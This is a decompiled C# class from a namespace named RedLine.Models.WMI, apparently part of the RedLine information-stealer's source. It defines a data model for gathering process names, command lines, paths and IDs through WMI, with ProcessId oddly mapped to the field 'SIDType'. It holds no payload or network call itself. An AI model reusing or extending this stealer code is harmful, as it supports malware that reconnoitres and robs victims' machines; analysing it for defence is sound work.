using System;

namespace RedLine.Models.WMI
{
	// Token: 0x02000028 RID: 40
	public class WmiProcess
	{
		// Token: 0x17000056 RID: 86
		// (get) Token: 0x060000E5 RID: 229 RVA: 0x00003FDD File Offset: 0x000021DD
		// (set) Token: 0x060000E6 RID: 230 RVA: 0x00003FE5 File Offset: 0x000021E5
		[WmiResult("CommandLine")]
		public string CommandLine { get; private set; }

		// Token: 0x17000057 RID: 87
		// (get) Token: 0x060000E7 RID: 231 RVA: 0x00003FEE File Offset: 0x000021EE
		// (set) Token: 0x060000E8 RID: 232 RVA: 0x00003FF6 File Offset: 0x000021F6
		[WmiResult("Name")]
		public string Name { get; private set; }

		// Token: 0x17000058 RID: 88
		// (get) Token: 0x060000E9 RID: 233 RVA: 0x00003FFF File Offset: 0x000021FF
		// (set) Token: 0x060000EA RID: 234 RVA: 0x00004007 File Offset: 0x00002207
		[WmiResult("ExecutablePath")]
		public string ExecutablePath { get; private set; }

		// Token: 0x17000059 RID: 89
		// (get) Token: 0x060000EB RID: 235 RVA: 0x00004010 File Offset: 0x00002210
		// (set) Token: 0x060000EC RID: 236 RVA: 0x00004018 File Offset: 0x00002218
		[WmiResult("SIDType")]
		public int ProcessId { get; private set; }

		// Token: 0x1700005A RID: 90
		// (get) Token: 0x060000ED RID: 237 RVA: 0x00004021 File Offset: 0x00002221
		// (set) Token: 0x060000EE RID: 238 RVA: 0x00004029 File Offset: 0x00002229
		[WmiResult("ParentProcessId")]
		public int ParentProcessId { get; private set; }

		// Token: 0x0400008A RID: 138
		internal const string COMMAND_LINE = "CommandLine";

		// Token: 0x0400008B RID: 139
		internal const string NAME = "Name";

		// Token: 0x0400008C RID: 140
		internal const string EXECUTABLE_PATH = "ExecutablePath";

		// Token: 0x0400008D RID: 141
		internal const string PROCESS_ID = "SIDType";

		// Token: 0x0400008E RID: 142
		internal const string PARENT_PROCESS_ID = "ParentProcessId";
	}
}
